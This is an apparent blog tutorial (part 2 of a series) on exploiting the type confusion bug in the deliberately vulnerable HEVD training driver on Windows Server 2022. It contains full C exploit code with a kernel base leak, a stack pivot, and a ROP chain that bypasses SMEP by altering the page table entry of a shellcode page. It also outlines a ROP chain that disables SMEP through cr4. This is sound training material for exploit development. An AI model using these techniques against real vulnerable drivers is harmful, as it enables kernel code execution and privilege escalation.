[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)

# HEVD Type Confusion Walkthrough on Windows 2022 (Part 2)

## We Have Code Execution

At the end of part 1 we had code execution, we were able to pass a 16 byte buffer into the driver vio an IOCTL. If our target was [Windows 7](https://github.com/plackyhacker/HEVD/blob/main/hevd_type_confusion.cpp) we could simply write some shellcode, allocate some memory in user space, copy our shellcode to this memory, and trigger the type confuusion bug to execute our code. In modern Windows OSes, such as Server 2022, we can't do that.

## Supervisor Mode Execution Prevention

Supervisor Mode Execution Prevention (SMEP) is a security feature found in modern CPUs that prevents kernel-mode code from executing user-mode code. If the kernel jumps to or executes code located in user space, SMEP triggers a fault, preventing the action and mitigating potential exploitation avenues like privilege escalation attacks.

SMEP is enforced in x86 architecture using the `cr4` register; more specifically the 20th bit of the `cr4` register. We can examine this register when connected to a debugee in **WinDbg**:

```
cr4=0000000000370678
0: kd> .formats cr4
Evaluate expression:
...
  Binary:  00000000 00000000 00000000 00000000 00000000 00110111 00000110 01111000
...
```

If the 20th bit (remember that the index is `0`) is set to `1` then SMEP is enabled. If we attempt to execute code in user space from kernel mode we will get a BSOD with an `ATTEMPTED EXECUTE OF NOEXECUTE MEMORY` stop code:

<img width="758" alt="image" src="https://github.com/user-attachments/assets/e51217aa-684e-4bbe-b689-3dc5bd0c6be0">

In practice this means we need to execute code in kernel space; but we only have one shot. After our code has executed, the saved return address on the stack will return control to the driver. This seems pretty lousy but we can work with it.

## A Plan

Our plan is this:

- Allocate some memory in user mode to act as a fake stack.
- Find a ROP gadget that will pivot the kernel stack to our allocated memory (this will be triggered by the bug).
- On this fake stack we will write a ROP chain to either disable SMEP, or:
- Change the allocated memory so SMEP believes the memory allocated for our shellcode is owned by the kernel.
- Ret to our shellcode when SMEP is under the thumb.

We could build our entire shellcode as a ROP chain on the fake stack, but in this series of posts I have chosen to play by SMEPs rules, and there's plenty of blogs showing how to disable SMEP.

## kASLR and DEP

We need to take into account **kASLR** and **DEP**. Kernel Address Space Layout Randomization (kASLR) is a security technique that does exactly what it says, it randomises the memory locations of code (and other memory mechanisms, such as the stack, and the heap) in the kernel. To defeat this we need to disclose the base address of the kernel module loaded in memory. Luckily we will do this from **medium integrity**, and we get this for free. If we were exploiting the driver from **low integirty**, such as from a browser compromise, we would need an additional vulnerability in the driver, or another driver, that discloses some kernel space memory.

Data Execution Prevention (DEP) is a security feature that prevents code from being executed in certain regions of memory, which are typically used for data storage. This isn't a big deal for us, we are using a ROP chain, and all of our gadgets will reside in executable memory, and we are assigning the user space memory for our shellcode. We will make this executable when we allocate it.

## Disclosing the Kernel Base Address

To get the base address of the kernel we can use a very common technique:

```c
QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}
```

The `EnumDeviceDrivers` Win32 API retrieves the load address for each device driver in the system. The good news for us is that the first address that is returned is the base address of the kernel. That was easy! Here is our code so far:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>

typedef uint64_t QWORD;

#define ARRAY_SIZE 1024

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main(int argc, char* argv[]) {
  // get the base of the kernel
  QWORD kernelBase = GetKernelBase();
  printf("[+] Kernel base: 0x%p\n", kernelBase);

  // let's not trigger the bug yet!
  return 0;

  // get a handle to the driver
  HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

  if (hDriver == INVALID_HANDLE_VALUE) {
    printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
    return 1;
  }

  char someData[] = {
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
  };

  DeviceIoControl(hDriver, 0x222023, (LPVOID)&someData, sizeof(someData), NULL, 0, NULL, NULL);

  return 0;
}
```

When we run the exploit on our target we get:

```
HEVD.exe
[+] Kernel base: 0xFFFFF80010A00000
```

We can check that it is correct in **WinDbg**:

```
1: kd> lm m nt
Browse full module list
start             end                 module name
fffff800`10a00000 fffff800`11a47000   nt
```

Now we have the base address of the kernel we can search for code chunks or gadgets that we can chain together to acheive our goal.

## User Mode Code Execution

We can execute code using the bug in the driver but we only control the first `call` to some code. Let's see what happens when we jump to some user space shellcode.

First we will create a `struct` to represent the user mode data we will send to the driver:

```c
typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;
```

Place this at the top of our exploit code and replace `someData` with this:

```c
USER_TYPE_CONFUSION_OBJECT userData = { 0 };
userData.ObjectID = (ULONG_PTR)0x4141414141414141;
userData.ObjectType = (ULONG_PTR)alloc;

DeviceIoControl(hDriver, 0x222023, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);
```

This sends an address that we have allocated to the driver to be executed. Let's allocate this shellcode now (do this at the start of the main function):

```c
char shellcode[] = {
  0xcc, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xcc
};

LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (!alloc)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
  return 1;
}

printf("[+] Memory allocated: 0x%p\n", alloc);

// copy the shellcode in to the memory
RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
printf("[+] Shellcode copied to: 0x%p\n", alloc);
```

If you have done any user mode process injection this probably looks familiar. We can compile the exploit, connect our Kernel debugger, and execute the exploit on the Debugee. Ensure you remove the `return` statement that circumvented the bug.

When we run the exploit **WinDbg** breaks:

```
*** Fatal System Error: 0x000000fc
                       (0x0000023F34240000,0x000000011BCCF867,0xFFFFF68FDF4BC580,0x0000000080000005)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff800`10e1edc0 cc              int     3
```

If we run `!analyze -v` to see what the bugcheck is:

```
0: kd> !analyze -v
...
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
...
```

This is **SMEP** preventing Kernel mode from executing code in user space. We need to be a bit more creative to gain code execution.

## Registers and a ROP NOP

We can use [RP++](https://github.com/0vercl0k/rp) to gather useful ROP gadgets from `ntoskrnl.exe` (take a copy of this from the target `C:\Windows\System32\`:

```
rp-win.exe -r 5 -f .\ntoskrnl.exe --va 0x0 > gadgets.txt
```

I generally use [Notepad++](https://notepad-plus-plus.org) to search for useful gadgets. We can find a `ret` gadget (otherwise known as a **ROP NOP**) and place it in our exploit code (replacing the call to our user space shellcode):

```c
userData.ObjectType = (ULONG_PTR)kernelBase + 0x639131;
```

In **WinDbg** we can set a breakpoint on this address:

```
1: kd> bp nt+0x639131
```

We can also confirm that the ROP gadget is what we think it is:

```
1: kd> u nt+0x639131
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
...
```

When we compile and run the exploit on the target **WinDbg** will break at this address, now we can examine the registers when the bug is triggered:

```
Breakpoint 0 hit
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
1: kd> r
rax=0000000000000000 rbx=ffff82862c702190 rcx=5b5c3b6748cd0000
rdx=0000000000000001 rsi=000000000000004d rdi=0000000000000003
rip=fffff80011039131 rsp=fffff68fdf3a3718 rbp=ffff8286312fd9d0
 r8=0000000000000008  r9=000000000000004d r10=000000006b636148
r11=fffff68fdf3a3718 r12=0000000000000000 r13=0000000000000000
r14=ffff82862c702190 r15=0000000000000010
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040286
nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
fffff800`11039131 c3              ret
```

Notice that `r11` is the same value as `rsp`. This will come in handy later when we need to restore the stack upon return to the driver code.

When starting to write an exploit I generally define two gadgets that I can use to debug:

```c
// ROP Gadgets
QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;
```

## Stack Pivoting

Because we can only execute one gadget we need to execute something that can allow is to execute a ROP chain in kernel mode, where the ROP gadgets are in kernel space. In order to do this we need to pivot the stack with our single gadget to a fake user space stack where we can put our ROP chain.

<img width="1059" alt="Screenshot 2024-08-26 at 16 35 32" src="https://github.com/user-attachments/assets/3605c86a-79ad-402e-8a84-cc7279bddf6f">

The first thing we need to do is locate a suitable `mov esp` gadget. For it to be suitable it should allign to 16 bytes (essentially end with `0`). We can search `ntsokrnl.exe` for this. When one is located we can allocate the user space memory, lock it in, and execute it:

```c
// stack pivoting gadgets/values
QWORD STACK_PIVOT_ADDR = 0xF6000000;
QWORD MOV_ESP = kernelBase + 0x28bdbb;          // mov esp, 0xF6000000; ret;

// prepare the new stack
QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

printf("[+] User space stack, allocated address: 0x%p\n", stack);

if (stack == 0x0)
{
  printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
  return 1;
}

printf("[+] VirtualLock, address: 0x%p\n", stack);
if (!VirtualLock((LPVOID)stack, 0x14000)) {
  printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
  return 1;
}
```

We have located a `mov esp` gadget that will pivot the stack to `0xf6000000`. We allocate memory at this location `-0x1000` and we allocate `0x14000` bytes for the size of the stack. The Kernel will write to the space before and after our ROP chain (fake stack) so we need to ensure we allocate this.

We also use the `VirtualLock` Win32 API. This ensures that the virtual memory is committed to physical memory and will not generate a page fault. Generating a page fault will cause a BSOD, we do not want that.

If we run our exploit now it will BSOD, so let's put something on the ROP chain and debug it:

```c
int index = 0;

// test rop chain
QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

// trigger a break
*(rop + index++) = INT3;

// some rop nops to examine
for (int i = 0; i < 50; i++)
  *(rop + index++) = ROP_NOP;

// ...

// allocate the userObject
USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute

// trigger the bug
DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);
```

We can compile the code and run it on the target with **WinDbg** attached to the Kernel:

```
Break instruction exception - code 80000003 (first chance)
nt!ExpQuerySystemInformation$filt$41+0xa:
fffff800`11252b70 cc              int     3
```

We hit the breakpoint on our ROP chain. Let's take a look at the stack:

```
1: kd> dq rsp
00000000`f6000008  fffff800`11039131 fffff800`11039131
00000000`f6000018  fffff800`11039131 fffff800`11039131
00000000`f6000028  fffff800`11039131 fffff800`11039131
00000000`f6000038  fffff800`11039131 fffff800`11039131
00000000`f6000048  fffff800`11039131 fffff800`11039131
00000000`f6000058  fffff800`11039131 fffff800`11039131
00000000`f6000068  fffff800`11039131 fffff800`11039131
00000000`f6000078  fffff800`11039131 fffff800`11039131
```

This shows all of our **rop nops**. Also notice where `rsp` points to now:

```
1: kd> r rsp
rsp=00000000f6000008
```

This is pointing in our user space stack. In the next section we will look at what we can do to defeat SMEP in our ROP chain, and `ret` to shellcode in user space. Don't forget to restart your target (or rollback to a snapshot) ready for the next section.

## Disabling SMEP

We can disable SMEP by altering the `cr4` register, this works but it can be a little bit tricky if you don't know what the `cr4` register contains on the target.

SMEP leverages the 20th bit of the Control Register 4 (`cr4`) in x86 processors. When the SMEP bit is enabled by setting it in `cr4`, it prevents the processor from executing user mode code in kernel mode.

We can write a ROP chain to disable SMEP:

```
pop rcx ; ret ;
[the new cr4 value]
mov cr4, rcx ; ret;
```

Feel free to have a go at this yourself. I am going to discuss a way we can play by SMEPs rules. This way we don't have to know what the existing `cr4` value is on the target. We will make SMEP believe the user space page is owned by Kernel space.

## Modifying Page Table Entries

A Page Table Entry (PTE) in Windows is a data structure that maps a virtual address to a physical address in memory. It contains information such as the page's physical address, access permissions (read/write), whether the page is present in memory, and other control bits like caching and execution permissions. PTEs are crucial for managing virtual memory, ensuring that the operating system can efficiently translate virtual addresses used by applications into actual physical memory locations.

The Kernel has a function named `MiGetPteAddress` that will take our virtual address as a parameter and return the address of the **PTE**. We can find the offset for this function in **WinDbg**:

```
1: kd> ?nt!MiGetPteAddress-nt
Evaluate expression: 3419076 = 00000000`00342bc4
```

We can use this offset in our ROP chain to find the address of the virtual memory we allocated for our shellcode, let's replace our ROP chain code:

```c
QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
*(rop + index++) = (QWORD)alloc;
*(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

// trigger a break
*(rop + index++) = INT3;
```

Using 64-bit calling convention we `pop` the address of our allocated memory in `rcx` as the first parameter. We then `ret` to `MiGetPteAddress`.

Compile and run the exploit on our target, with the debugger attached. The breakpoint should be hit:

```
Break instruction exception - code 80000003 (first chance)
nt!ExpQuerySystemInformation$filt$41+0xa:
fffff800`11252b70 cc              int     3
```

We can examine the registers, `rax` should hold the **PTE** for the virtual memory allocated for our shellcode:

```
1: kd> r
rax=ffffde80e2765180 rbx=ffff82862c702190 rcx=00000000e2765180
rdx=0000000000000001 rsi=000000000000004d rdi=0000000000000003
rip=fffff80011252b70 rsp=00000000f6000020 rbp=ffff82862f219050
 r8=0000000000000008  r9=000000000000004d r10=000000006b636148
r11=fffff68fe05aa718 r12=0000000000000000 r13=0000000000000000
r14=ffff82862c702190 r15=0000000000000010
iopl=0         nv up ei ng nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040282
nt!ExpQuerySystemInformation$filt$41+0xa:
fffff800`11252b70 cc              int     3
```

We can view this structure in **WinDbg**:

```
1: kd> dt _MMPTE_HARDWARE ffffde80e2765180
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y1
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y0
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y0000000000000000001001000111101111001100 (0x247bcc)
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y0
```

Notice that the 3rd bit is the `Owner` and is currently valued at `1` (User). Our next task is to build a ROP chain to change this bit to `0` (Kernel). This would be quite easy in `asm`:

```masm
pop rcx, [memory of VA for shellcode]      ; set parameter to address of shellcode
call MiGetPteAddress                       ; call MiGetPteAddress
mov r10, rax                               ; save returned value for later
mov rcx, qword [rax]                       ; move the value in the PTE to rcx
sub rcx, 0x4                               ; zero the 3rd bit
mov qword [r10], rcx                       ; save the new value back to the PTE address
wbinvd                                     ; flush the processor cache
```

The problem is the gadgets we require aren't always available. I came up with the following pretty quickly but you may be able to find something better:

```c
*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
*(rop + index++) = (QWORD)alloc;
*(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                // add rsp, 0x28; ret;
// junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r8 = Shellcode's PTE address

*(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                // add rsp, 0x28; ret;
// junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r10 = Shellcode's PTE address

*(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                // rax = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                // add rsp, 0x28; ret;
// junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r8 = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                // r8 = rcx = rax = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
*(rop + index++) = (QWORD)0x4;
*(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                // rcx = rax = modified PTE value

*(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                // moves the modified PTE value to the PTE address

*(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;

// ret to user space shellcode
*(rop + index++) = (QWORD)alloc;
```

If we plug this in to our exploit we should be able to get code execution in user space.

## User Mode Code Execution Take 2

Now when we run our exploit on the target we should hit the breakpoint in our user space shellcode:

```
1: kd> g
Break instruction exception - code 80000003 (first chance)
00000295`cf8b0000 cc              int     3
```

We can look at `r10`, in our ROP chain this was set to point at the **PTE** address of our allocated virtual memory:

```
1: kd> r r10
r10=ffffde814ae7c580
1: kd> dt _MMPTE_HARDWARE ffffde814ae7c580
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   ...
```

We can see here that the user space page is owned by the Kernel! We now have control of `rip` and can execute our own shellcode.

Remember earlier we examined the registers and observed that `r11` contained the value in `rsp`? Provided we haven't changed the value in `r11` (and we haven't) we can restore the stack and return execution back to the driver:

```c
char shellcode[] = {
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x4c, 0x89, 0xdc,    // mov    rsp,r11
  0xc3                 // ret
};
```

I have changed the shellcode to execute 8 nops then restore the stack and return to the driver. We can compile the exploit, copy it to the target and execute it:

<img width="918" alt="Screenshot 2024-08-26 at 19 00 27" src="https://github.com/user-attachments/assets/10455a12-0bf6-4751-bbea-8d3ff81fa487">

Excellent! We execute our shellcode and restore execution back within the driver when we are done. We have a stable exploit, albeit one that doesn't execute any useful shellcode yet.

In part 3 we will write shellcode to escalate our privileges.

I have included the full code so far:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>

typedef uint64_t QWORD;

#define ARRAY_SIZE 1024

typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main(int argc, char* argv[]) {

    char shellcode[] = {
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x4c, 0x89, 0xdc,    // mov    rsp,r11
        0xc3                 // ret
    };

    LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!alloc)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
        return 1;
    }

    printf("[+] Memory allocated: 0x%p\n", alloc);

    // copy the shellcode in to the memory
    RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copied to: 0x%p\n", alloc);

    // get the base of the kernel
    QWORD kernelBase = GetKernelBase();
    printf("[+] Kernel base: 0x%p\n", kernelBase);

    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // ROP Gadgets
    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;

    // stack pivoting gadgets/values
    QWORD STACK_PIVOT_ADDR = 0xF6000000;
    QWORD MOV_ESP = kernelBase + 0x28bdbb;                          // mov esp, 0xF6000000; ret;

    // prepare the new stack
    QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
    LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] User space stack, allocated address: 0x%p\n", stack);

    if (stack == 0x0)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
        return 1;
    }

    printf("[+] VirtualLock, address: 0x%p\n", stack);
    if (!VirtualLock((LPVOID)stack, 0x14000)) {
        printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
        return 1;
    }

    int index = 0;
    QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
    *(rop + index++) = (QWORD)alloc;
    *(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r10 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                    // rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                    // r8 = rcx = rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
    *(rop + index++) = (QWORD)0x4;
    *(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                    // rcx = rax = modified PTE value

    *(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                    // moves the modified PTE value to the PTE address

    *(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;

    // ret to user space shellcode
    *(rop + index++) = (QWORD)alloc;

    // allocate the userObject
    USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
    userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
    userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute

    printf("[!] Press a key to trigger the bug...\n");
    getchar();

    // trigger the bug
    DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);

    return 0;
}
```
[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)
